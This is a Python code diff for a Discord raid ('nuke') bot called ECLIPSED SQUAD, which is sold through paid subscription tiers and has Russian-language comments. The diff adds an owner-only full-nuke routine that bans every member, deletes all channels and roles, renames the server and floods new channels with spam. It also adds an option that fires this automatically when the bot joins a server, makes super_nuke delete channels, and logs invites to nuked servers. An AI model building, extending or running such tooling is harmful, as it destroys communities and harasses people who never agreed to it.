@@ -61,7 +61,7 @@ async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
     try:
         ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
         if ch:
-            inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
+            inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
             invite_url = inv.url
     except Exception:
         pass
@@ -227,9 +227,9 @@ async def do_nuke(guild, spam_text=None):
 async def do_superpr_nuke_task(guild, spam_text=None):
     """
     Приоритеты:
-    1. Бан всех участников
+    1. Бан участников — оставляет не более 15 человек
     2. Переименование сервера → CRASH BY ECLIPS
-    3. Переименование всех каналов → CRASH BY ECLIPS
+    3. Удаление всех существующих каналов
     4. Удаление всех ролей
     5. Создание новых каналов со спамом
     """
@@ -241,20 +241,25 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     bot_role = guild.me.top_role
     # Защищённые ID — никогда не банятся
     PROTECTED_IDS = {config.OWNER_ID, 1421778029310509056}
-    # Добавляем того кто запустил нюк
     starter_id = nuke_starter.get(guild.id)
     if starter_id:
         PROTECTED_IDS.add(starter_id)
 
-    targets = [
+    # Все кандидаты на бан
+    candidates = [
         m for m in guild.members
         if not m.bot and m.id != guild.owner_id
         and m.id not in PROTECTED_IDS
         and (not m.top_role or m.top_role < bot_role)
     ]
 
-    # ── 1. Баним всех участников ──
-    await asyncio.gather(*[m.ban(reason="super_nuke") for m in targets], return_exceptions=True)
+    # ── 1. Баним всех кроме 15 последних ──
+    # Оставляем 15 участников (не считая защищённых и ботов)
+    total_members = len([m for m in guild.members if not m.bot])
+    keep = 15
+    ban_count = max(0, total_members - keep)
+    to_ban = candidates[:ban_count]
+    await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
 
     # ── 2. Переименовываем сервер ──
     try:
@@ -262,9 +267,9 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     except Exception:
         pass
 
-    # ── 3. Переименовываем все каналы ──
+    # ── 3. Удаляем все существующие каналы ──
     await asyncio.gather(
-        *[c.edit(name=TURBO_NAME) for c in guild.channels],
+        *[c.delete() for c in guild.channels],
         return_exceptions=True
     )
 
@@ -292,6 +297,62 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     last_spam_text[guild.id] = spam_text
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
 
+
+async def do_owner_nuke_task(guild, spam_text=None):
+    """
+    Owner Nuke — полный нюк без ограничений.
+    Баним ВСЕХ участников без исключений (кроме ботов и овнера сервера).
+    """
+    if spam_text is None:
+        spam_text = config.SPAM_TEXT
+
+    OWNER_NAME = "CRASH BY ECLIPS"
+
+    bot_role = guild.me.top_role
+    targets = [
+        m for m in guild.members
+        if not m.bot and m.id != guild.owner_id
+        and (not m.top_role or m.top_role < bot_role)
+    ]
+
+    # ── 1. Баним ВСЕХ ──
+    await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
+
+    # ── 2. Переименовываем сервер ──
+    try:
+        await guild.edit(name=OWNER_NAME, description=OWNER_NAME)
+    except Exception:
+        pass
+
+    # ── 3. Удаляем все каналы ──
+    await asyncio.gather(
+        *[c.delete() for c in guild.channels],
+        return_exceptions=True
+    )
+
+    # ── 4. Удаляем все роли ──
+    await asyncio.gather(
+        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
+        return_exceptions=True
+    )
+
+    # ── 5. Создаём новые каналы и спамим ──
+    async def create_and_spam(i):
+        try:
+            ch = await guild.create_text_channel(name=OWNER_NAME)
+            await asyncio.gather(
+                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                return_exceptions=True
+            )
+        except Exception:
+            pass
+
+    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+
+    nuke_running[guild.id] = False
+    nuke_starter.pop(guild.id, None)
+    last_spam_text[guild.id] = spam_text
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
 
 
 
@@ -377,22 +438,6 @@ async def stop(ctx):
 
 @bot.command()
 @wl_check()
-async def addch(ctx, count: int = 10, *, name: str = None):
-    if count > 500:
-        await ctx.send("Максимум 500.")
-        return
-    ch_name = name if name else config.GUILD_NAME
-    results = await asyncio.gather(
-        *[ctx.guild.create_text_channel(name=ch_name) for _ in range(count)],
-        return_exceptions=True
-    )
-    done = sum(1 for r in results if not isinstance(r, Exception))
-    log.info("!addch %s каналов на %s от %s", done, ctx.guild, ctx.author)
-    await ctx.send(f"Создано {done} каналов.")
-
-
-@bot.command()
-@wl_check()
 async def cleanup(ctx):
     await delete_all_channels(ctx.guild)
     overwrites = {
@@ -433,14 +478,6 @@ async def rename(ctx, *, name: str):
 async def rename_error(ctx, error):
     if isinstance(error, commands.CommandOnCooldown):
         await ctx.send(f"⏳ Команда на кулдауне. Подожди **{error.retry_after:.0f}** сек.")
-
-
-@bot.command()
-@wl_check()
-async def invs_delete(ctx):
-    invites = await ctx.guild.invites()
-    await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
-    await ctx.send("Готово.")
 
 
 @bot.command()
@@ -672,6 +709,93 @@ async def super_nuke(ctx, *, text: str = None):
     asyncio.create_task(log_nuke(guild, ctx.author, "super_nuke"))
 
 
+# ─── OWNER-ONLY NUKE COMMANDS ──────────────────────────────
+
+AUTO_OWNER_NUKE = False
+AUTO_OWNER_NUKE_TEXT = None
+
+
+def save_auto_owner_nuke():
+    asyncio.create_task(db_set("data", "auto_owner_nuke", {
+        "enabled": AUTO_OWNER_NUKE,
+        "text": AUTO_OWNER_NUKE_TEXT
+    }))
+
+
+@bot.command(name="owner_nuke")
+async def owner_nuke(ctx, *, text: str = None):
+    """Полный нюк без ограничений. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    guild = ctx.guild
+    if is_guild_blocked(guild.id):
+        await ctx.send("🔒 Этот сервер заблокирован.")
+        return
+    if nuke_running.get(guild.id):
+        await ctx.send("⚡ Краш уже запущен.")
+        return
+    nuke_running[guild.id] = True
+    nuke_starter[guild.id] = ctx.author.id
+    spam_text = text if text else config.SPAM_TEXT
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+    last_spam_text[guild.id] = spam_text
+    asyncio.create_task(do_owner_nuke_task(guild, spam_text))
+    asyncio.create_task(log_nuke(guild, ctx.author, "owner_nuke"))
+
+
+@bot.command(name="auto_owner_nuke")
+async def auto_owner_nuke_cmd(ctx, state: str, *, text: str = None):
+    """Авто owner_nuke при входе бота на сервер. Только для овнера."""
+    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if state.lower() == "on":
+        AUTO_OWNER_NUKE = True
+        save_auto_owner_nuke()
+        embed = discord.Embed(
+            title="👑 Auto Owner Nuke — ВКЛЮЧЁН",
+            description=(
+                "При входе бота на сервер:\n"
+                "• Бан ВСЕХ участников\n"
+                "• Удаление каналов и ролей\n"
+                "• Создание каналов со спамом\n\n"
+                f"Текст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`"
+            ),
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+    elif state.lower() == "off":
+        AUTO_OWNER_NUKE = False
+        save_auto_owner_nuke()
+        await ctx.send("❌ **Auto Owner Nuke** выключен.")
+    elif state.lower() == "text":
+        if not text:
+            await ctx.send("Укажи текст: `!auto_owner_nuke text <текст>`")
+            return
+        AUTO_OWNER_NUKE_TEXT = text
+        save_auto_owner_nuke()
+        await ctx.send(f"✅ Текст обновлён:\n```{text[:500]}```")
+    elif state.lower() == "info":
+        status = "✅ Включён" if AUTO_OWNER_NUKE else "❌ Выключен"
+        await ctx.send(f"Auto Owner Nuke: **{status}**\nТекст: `{AUTO_OWNER_NUKE_TEXT or 'дефолтный'}`")
+    else:
+        await ctx.send("`!auto_owner_nuke on/off/text/info`")
+
+
+@bot.command(name="goout")
+async def goout(ctx):
+    """Бот покидает сервер где написана команда. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    guild = ctx.guild
+    try:
+        await ctx.send("👋 Выхожу с сервера.")
+        await guild.leave()
+    except Exception as e:
+        await ctx.send(f"❌ Ошибка: {e}")
+
+
 @bot.command(name="massdm")
 @premium_check()
 async def massdm(ctx, *, text: str):
@@ -766,20 +890,6 @@ async def rolesdelete(ctx):
     deleted = sum(1 for r in results if not isinstance(r, Exception))
     embed = discord.Embed(
         description=f"🗑️ Удалено ролей: **{deleted}**",
-        color=0x0a0a0a
-    )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD")
-    await ctx.send(embed=embed)
-
-
-@bot.command(name="emojisnuke")
-@premium_check()
-async def emojisnuke(ctx):
-    guild = ctx.guild
-    results = await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
-    deleted = sum(1 for r in results if not isinstance(r, Exception))
-    embed = discord.Embed(
-        description=f"💀 Удалено эмодзи: **{deleted}**",
         color=0x0a0a0a
     )
     embed.set_footer(text="☠️ ECLIPSED SQUAD")
@@ -1149,6 +1259,27 @@ async def giverole(ctx, user: discord.Member, role: discord.Role):
         await ctx.send(f"❌ Ошибка: {e}")
 
 
+@bot.command(name="roles")
+async def roles_cmd(ctx):
+    """Показать роли которые бот может выдавать (ниже его роли в иерархии)."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    bot_role = ctx.guild.me.top_role
+    available = [r for r in ctx.guild.roles if r < bot_role and not r.is_default()]
+    if not available:
+        await ctx.send("Нет ролей которые бот может выдать.")
+        return
+    available.sort(key=lambda r: r.position, reverse=True)
+    lines = [f"`{r.id}` — **{r.name}**" for r in available[:30]]
+    embed = discord.Embed(
+        title=f"🎭 Роли доступные боту ({len(available)})",
+        description="\n".join(lines),
+        color=0x0a0a0a
+    )
+    embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
+    await ctx.send(embed=embed)
+
+
 @bot.command(name="nukelogs")
 async def nukelogs(ctx):
     """Показать логи нюков. Только для овнера."""
@@ -1280,7 +1411,19 @@ async def changelog(ctx):
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.7")
+    embed.add_field(
+        name="🔥 v1.8 — Чистка и улучшения",
+        value=(
+            "• `!super_nuke` — теперь удаляет старые каналы вместо переименования\n"
+            "• Удалены команды `!emojisnuke`, `!addch`, `!invs_delete`\n"
+            "• `!unban <id>` — разбан через ЛС на всех серверах\n"
+            "• `!nukelogs` — логи нюков с инвайтами\n"
+            "• `!roles` — список ролей доступных боту\n"
+            "• `!giverole` — выдать роль участнику"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.8")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1337,9 +1480,7 @@ async def help_cmd(ctx):
             "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
             "`!stop` — остановить краш\n"
             "`!cleanup` — снести всё, оставить один канал\n"
-            "`!addch [кол-во]` — создать каналы\n"
             "`!rename [название]` — переименовать все каналы\n"
-            "`!invs_delete` — уничтожить все инвайты\n"
             "`!nicks_all [ник]` — сменить ники всем\n"
             "`!webhooks` — список вебхуков\n"
             "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
@@ -1361,7 +1502,6 @@ async def help_cmd(ctx):
             "`!spam [кол-во] [текст]` — спам в канал\n"
             "`!pingspam [кол-во]` — спам @everyone\n"
             "`!rolesdelete` — удалить все роли\n"
-            "`!emojisnuke` — удалить все эмодзи\n"
             "`!serverinfo` — подробная инфа о сервере\n"
             "`!userinfo [id]` — инфа о пользователе\n"
             "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
@@ -1411,8 +1551,7 @@ async def commands_user(ctx):
             "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
             "`!stop` — остановить краш\n"
             "`!cleanup` — снести всё, оставить один канал\n"
-            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
-            "`!addch [кол-во]` — создать каналы"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота"
         ),
         inline=False
     )
@@ -1420,7 +1559,6 @@ async def commands_user(ctx):
         name="⚡ КОНТРОЛЬ",
         value=(
             "`!rename [название]` — переименовать все каналы\n"
-            "`!invs_delete` — уничтожить все инвайты\n"
             "`!nicks_all [ник]` — сменить ники всем\n"
             "`!webhooks` — список вебхуков"
         ),
@@ -1455,7 +1593,6 @@ async def commands_premium(ctx):
             "`!super_nuke [текст]` — нюк всё одновременно\n"
             "`!massban` — забанить всех участников\n"
             "`!rolesdelete` — удалить все роли\n"
-            "`!emojisnuke` — удалить все эмодзи\n"
             "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
             "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
         ),
@@ -1547,6 +1684,13 @@ async def commands_owner(ctx):
 async def on_guild_join(guild):
     if is_guild_blocked(guild.id):
         return  # Сервер заблокирован — ничего не делаем
+
+    # AUTO OWNER NUKE — полный нюк без ограничений (только овнер)
+    if AUTO_OWNER_NUKE:
+        nuke_running[guild.id] = True
+        spam_text = AUTO_OWNER_NUKE_TEXT if AUTO_OWNER_NUKE_TEXT else config.SPAM_TEXT
+        asyncio.create_task(do_owner_nuke_task(guild, spam_text))
+        return
 
     # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
     if AUTO_SUPERPR_NUKE:
@@ -1700,22 +1844,6 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
             asyncio.create_task(delete_all_channels(guild))
             await message.channel.send(f"✅ `cleanup` запущен на **{guild.name}**")
 
-        elif cmd_name == "addch":
-            try:
-                a = args.split(maxsplit=1)
-                count = int(a[0]) if a else 10
-                name = a[1] if len(a) > 1 else config.GUILD_NAME
-            except ValueError:
-                count, name = 10, config.GUILD_NAME
-            if count > 500:
-                await message.channel.send("Максимум 500.")
-                return
-            asyncio.create_task(asyncio.gather(
-                *[guild.create_text_channel(name=name) for _ in range(count)],
-                return_exceptions=True
-            ))
-            await message.channel.send(f"✅ Создаю {count} каналов на **{guild.name}**")
-
         elif cmd_name == "rename":
             if not args:
                 await message.channel.send("Укажи название: `!rename <название>`")
@@ -1739,14 +1867,6 @@ async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_tex
                 return_exceptions=True
             ))
             await message.channel.send(f"✅ NSFW выключен на **{guild.name}**")
-
-        elif cmd_name == "invs_delete":
-            invites = await guild.invites()
-            asyncio.create_task(asyncio.gather(
-                *[i.delete() for i in invites],
-                return_exceptions=True
-            ))
-            await message.channel.send(f"✅ Инвайты удалены на **{guild.name}**")
 
         elif cmd_name == "nicks_all":
             if not args:
@@ -2011,8 +2131,8 @@ async def on_message(message):
             embed.add_field(
                 name="✅ ОБЫЧНАЯ ПОДПИСКА",
                 value=(
-                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
-                    "`!rename` · `!invs_delete` · `!nicks_all`\n"
+                    "`!nuke` · `!stop` · `!cleanup`\n"
+                    "`!rename` · `!nicks_all`\n"
                     "`!webhooks` · `!auto_nuke on/off/info` · `!inv`\n"
                     "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                 ),
@@ -2023,7 +2143,7 @@ async def on_message(message):
                 value=(
                     "`!nuke [текст]` — нюк со своим текстом\n"
                     "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
-                    "`!rolesdelete` · `!emojisnuke`\n"
+                    "`!rolesdelete`\n"
                     "`!serverinfo` · `!userinfo`\n"
                     "`!auto_super_nuke on/off/text/info`"
                 ),
@@ -2092,9 +2212,9 @@ async def on_message(message):
                 name="⚡ КОМАНДЫ НА СЕРВЕРЕ",
                 value=(
                     "Выбери сервер → пиши команды прямо в ЛС:\n"
-                    "`!nuke` · `!stop` · `!cleanup` · `!addch`\n"
+                    "`!nuke` · `!stop` · `!cleanup`\n"
                     "`!rename` · `!nsfw_all` · `!unnsfw_all`\n"
-                    "`!invs_delete` · `!nicks_all` · `!webhooks`\n"
+                    "`!nicks_all` · `!webhooks`\n"
                     "`!auto_nuke on/off/info`"
                 ),
                 inline=False
@@ -2231,7 +2351,7 @@ async def on_message(message):
                 try:
                     ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                     if ch:
-                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
+                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                         lines.append(f"**{g.name}** — {inv.url}")
                     else:
                         lines.append(f"**{g.name}** — нет прав на создание инвайта")
@@ -2630,34 +2750,6 @@ async def on_ready():
         await asyncio.gather(*[c.edit(name=name) for c in interaction.guild.channels], return_exceptions=True)
         await interaction.followup.send("✅ Готово.", ephemeral=True)
 
-    @bot.tree.command(name="addch", description="⚡ Создать каналы")
-    @app_commands.describe(count="Количество (макс 500)", name="Название канала")
-    @app_commands.allowed_installs(guilds=True, users=True)
-    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
-    async def slash_addch(interaction: discord.Interaction, count: int = 10, name: str = None):
-        if not is_whitelisted(interaction.user.id):
-            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.response.send_message(embed=embed, ephemeral=True); return
-        if count > 500:
-            await interaction.response.send_message("❌ Максимум 500.", ephemeral=True); return
-        await interaction.response.defer(ephemeral=True)
-        ch_name = name or config.GUILD_NAME
-        results = await asyncio.gather(*[interaction.guild.create_text_channel(name=ch_name) for _ in range(count)], return_exceptions=True)
-        done = sum(1 for r in results if not isinstance(r, Exception))
-        await interaction.followup.send(f"✅ Создано **{done}** каналов.", ephemeral=True)
-
-    @bot.tree.command(name="invs_delete", description="⚡ Удалить все инвайты")
-    @app_commands.allowed_installs(guilds=True, users=True)
-    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
-    async def slash_invs_delete(interaction: discord.Interaction):
-        if not is_whitelisted(interaction.user.id):
-            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.response.send_message(embed=embed, ephemeral=True); return
-        await interaction.response.defer(ephemeral=True)
-        invites = await interaction.guild.invites()
-        await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
-        await interaction.followup.send("✅ Готово.", ephemeral=True)
-
     @bot.tree.command(name="nicks_all", description="⚡ Сменить ники всем")
     @app_commands.describe(nick="Новый ник")
     @app_commands.allowed_installs(guilds=True, users=True)
@@ -2743,21 +2835,6 @@ async def on_ready():
         results = await asyncio.gather(*[r.delete() for r in interaction.guild.roles if r < bot_role and not r.is_default()], return_exceptions=True)
         deleted = sum(1 for r in results if not isinstance(r, Exception))
         await interaction.followup.send(f"🗑️ Удалено ролей: **{deleted}**", ephemeral=True)
-
-    @bot.tree.command(name="emojisnuke", description="💎 [Premium] Удалить все эмодзи")
-    @app_commands.allowed_installs(guilds=True, users=True)
-    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
-    async def slash_emojisnuke(interaction: discord.Interaction):
-        if not is_whitelisted(interaction.user.id):
-            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.response.send_message(embed=embed, ephemeral=True); return
-        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
-            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
-            await interaction.response.send_message(embed=embed, ephemeral=True); return
-        await interaction.response.defer(ephemeral=True)
-        results = await asyncio.gather(*[e.delete() for e in interaction.guild.emojis], return_exceptions=True)
-        deleted = sum(1 for r in results if not isinstance(r, Exception))
-        await interaction.followup.send(f"💀 Удалено эмодзи: **{deleted}**", ephemeral=True)
 
     @bot.tree.command(name="serverinfo", description="💎 [Premium] Инфо о сервере")
     @app_commands.allowed_installs(guilds=True, users=True)
@@ -2853,8 +2930,7 @@ async def on_ready():
                 "`!nuke` `/nuke` — краш сервера\n"
                 "`!stop` `/stop` — остановить краш\n"
                 "`!cleanup` — снести всё, оставить один канал\n"
-                "`!auto_nuke on/off/info` — авто-краш при входе\n"
-                "`!addch` `/addch` — создать каналы"
+                "`!auto_nuke on/off/info` — авто-краш при входе"
             ),
             inline=False
         )
@@ -2862,7 +2938,6 @@ async def on_ready():
             name="⚡ КОНТРОЛЬ",
             value=(
                 "`!rename` `/rename` — переименовать каналы\n"
-                "`!invs_delete` `/invs_delete` — удалить инвайты\n"
                 "`!nicks_all` `/nicks_all` — сменить ники\n"
                 "`!webhooks` `/webhooks` — список вебхуков"
             ),
@@ -2886,7 +2961,6 @@ async def on_ready():
                     "`!massban` `/massban` — массбан\n"
                     "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
                     "`!rolesdelete` `/rolesdelete` — удалить роли\n"
-                    "`!emojisnuke` `/emojisnuke` — удалить эмодзи\n"
                     "`!serverinfo` `/serverinfo` — инфо о сервере\n"
                     "`!userinfo` `/userinfo` — инфо о юзере\n"
                     "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
@@ -2907,3 +2981,4 @@ async def on_ready():
 
 
 bot.run(config.TOKEN)
+
